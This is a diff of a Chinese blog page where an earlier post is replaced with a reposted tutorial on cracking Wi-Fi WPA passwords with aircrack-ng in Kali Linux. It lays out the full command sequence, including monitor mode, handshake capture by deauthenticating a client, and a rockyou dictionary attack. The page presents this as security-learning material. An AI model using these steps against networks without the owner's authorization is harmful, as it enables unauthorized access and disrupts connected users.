@@ -50,12 +50,71 @@
         <main id="main" class="site-main" role="main">
             <article id="post-1270" class="post-1270 post type-post status-publish format-standard hentry category-90 category-129 tag-149">
                 <header class="entry-header">
-                    <h1 class="entry-title">侠以武犯禁，儒以文乱法。</h1>
-                    <p class="entry-census">发布于 2020-09-24</p>
+                    <h1 class="entry-title">Kali下使用Aircrack-ng破解无线WIFI密码</h1>
+                    <p class="entry-census">发布于 2020-09-29</p>
                     <hr>
                 </header>
                 <div class="neko">
-                    <p>这些所谓的侠义之人，正是国家最大的乱源。</p>
+                    <p>首先，如果kali是装在虚拟机里面的话，是不能用物理机的无线网卡的。所以，如果我们要想进行无线破解，需要外接一个无线网卡设备，并且该设备要支持 monitor 监听模式</p>
+<p>iwconfig :系统配置无线网络设备或显示无线网络设备信息的命令。iwconfig命令类似于ifconfig命令，但是他配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段<br>
+auto： 自动模式<br>
+essid：设置ESSID<br>
+nwid：设置网络ID<br>
+freq： 设置无线网络通信频段<br>
+chanel： 设置无线网络通信频段<br>
+sens： 设置无线网络设备的感知阀值<br>
+mode： 设置无线网络设备的通信设备<br>
+ap： 强迫无线网卡向给定地址的接入点注册<br>
+nick&lt;名字&gt;： 为网卡设定别名<br>
+rate&lt;速率&gt;： 设定无线网卡的速率<br>
+rts&lt;阀值&gt;： 在传输数据包之前增加一次握手，确信信道在正常的<br>
+power： 无线网卡的功率设置</p>
+<p>破解无线wifi可以分为以下几步：<br>
+查看网卡名字：iwconfig<br>
+设置网卡为监听模式：airmon-ng  start wlan0<br>
+扫描附近的WIFI：airodump-ng  wlan0mon<br>
+选定一个路由器，并监听其流量：airodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon<br>
+选定连接的一个客户端，进行攻击：aireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon<br>
+对抓取到的cap包进行暴力破解：aircrack-ng  -w  password.txt  -b BC:46:99:3D:66:D6 tplink-01.cap</p>
+<p>1 查看无线网卡名字：iwconfig   或者  ifconfig  -a   都可以<br>
+<img src="https://Moonbow1999.github.io/post-images/1601340502503.png" alt="" loading="lazy"></p>
+<p>2 开启网卡监听模式：airmon-ng  start wlan0   。网卡开启了监听模式之后网卡的名字就变为 wlan0mon  了，以后的所有命令中的网卡名都是叫 wlan0mon<br>
+<img src="https://Moonbow1999.github.io/post-images/1601340543821.png" alt="" loading="lazy"></p>
+<p>3 扫描附近的WIFI：airodump-ng  wlan0mon ，会显示附近所有的WIFI信号。<br>
+BSSID代表路由器的 MAC 地址<br>
+PWR 代表信号的强度，数值越大代表信息越强<br>
+CH 代表信道<br>
+ENC代表用的加密的方式<br>
+AUTH 代表认证的方式<br>
+ESSID是WIFI的名字<br>
+我们需要选定一个准备破解的WIFI，我们选 tplink-5<br>
+<img src="https://Moonbow1999.github.io/post-images/1601340596247.png" alt="" loading="lazy"></p>
+<p>4 监听该路由器的流量：<br>
+airodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon</p>
+<h1 id="-w-参数指定生成的文件名-c-指定信道-bssid指定路由器的mac地址">-w 参数指定生成的文件名  -c 指定信道 --bssid指定路由器的MAC地址</h1>
+<p>下面的 STATION 是连接该WIFI的客户端，下面这里只有一个客户端连接了该WIFI。如果有多个客户端连接的话，我们最好选择活跃点的客户端。<br>
+<img src="https://Moonbow1999.github.io/post-images/1601340693919.png" alt="" loading="lazy"></p>
+<p>5 重新打开一个命令行窗口，开始攻击！之前的窗口继续保留，用于观察是否抓包成功<br>
+aireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon</p>
+<h1 id="50是发包的数量-a指定路由器的mac地址-c指定连接的客户端的mac地址">50是发包的数量 -a指定路由器的MAC地址  -c指定连接的客户端的MAC地址</h1>
+<p>该命令会打断连接客户端和WIFI之间的连接，等到客户端重新连接WIFI的时候，就会抓取他们之间的握手认证包！<br>
+<img src="https://Moonbow1999.github.io/post-images/1601340981404.png" alt="" loading="lazy"><br>
+如果看到下面红色圈住的这些，就说明握手包抓取成功了<br>
+<img src="https://Moonbow1999.github.io/post-images/1601341029341.png" alt="" loading="lazy"><br>
+我们可以看到会生成四个文件，其中我们有用的文件是以 cap 后缀结尾的文件<br>
+<img src="https://Moonbow1999.github.io/post-images/1601341078589.png" alt="" loading="lazy"></p>
+<p>6 对抓取到的cap包进行破解，这需要我们准备好破解的密码字典。所以，无论是任何破解，都需要一个强大的密码字典！<br>
+kali下自带有一份无线密码字典——&gt; /usr/share/wordlists/rockyou.txt.gz ，我们将其解压<br>
+<img src="https://Moonbow1999.github.io/post-images/1601341129391.png" alt="" loading="lazy"><br>
+<img src="https://Moonbow1999.github.io/post-images/1601341144428.png" alt="" loading="lazy"><br>
+aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap<br>
+#-w指定 密码字典 -b指定路由器的MAC地址<br>
+可以看到，破解成功！该WIFI的密码为 www.123.com<br>
+<img src="https://Moonbow1999.github.io/post-images/1601341216886.png" alt="" loading="lazy"><br>
+从最后可以看出，要想破解出WIFI的密码，还是得需要一个很强大的字典！</p>
+<p>本文转载自 https://blog.csdn.net/qq_36119192/article/details/84254622</p>
+<p>免责声明：</p>
+<p>本站所有信息仅供安全学习、研究所用，请勿用于非法用途，否则造成的一切后果自负。</p>
 
                 </div>
             </article>
@@ -65,20 +124,14 @@
         <div class="mdui-container">
             <div class="mdui-row">
                 
-                <a href="https://Moonbow1999.github.io/post/kali-xia-shi-yong-aircrack-ng-po-jie-wu-xian-wifi-mi-ma/" class="mdui-ripple mdui-color-theme mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left">
-                    <div class="doc-footer-nav-text">
-                        <i class="mdui-icon material-icons">arrow_back</i>
-                        <span class="doc-footer-nav-direction mdui-hidden-xs-down">上一篇文章</span>
-                        <div class="doc-footer-nav-chapter mdui-hidden-xs-down">Kali下使用Aircrack-ng破解无线WIFI密码</div>
-                    </div>
-                </a>
+                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
                 
                 
-                <a href="https://Moonbow1999.github.io/post/win10-xiu-fu-yi-chang-guan-ji-dao-zhi-de-ying-pan-xie-bao-hu/" class="mdui-ripple mdui-color-theme mdui-col-xs-10 mdui-col-sm-6 doc-footer-nav-right">
+                <a href="https://Moonbow1999.github.io/post/xia-yi-wu-fan-jin-ru-yi-wen-luan-fa/" class="mdui-ripple mdui-color-theme mdui-col-xs-10 mdui-col-sm-6 doc-footer-nav-right">
                     <div class="doc-footer-nav-text">
                         <i class="mdui-icon material-icons">arrow_forward</i>
                         <span class="doc-footer-nav-direction">下一篇文章</span>
-                        <div class="doc-footer-nav-chapter">Win10修复异常关机导致的硬盘写保护</div>
+                        <div class="doc-footer-nav-chapter">侠以武犯禁，儒以文乱法。</div>
                     </div>
                 </a>
                 
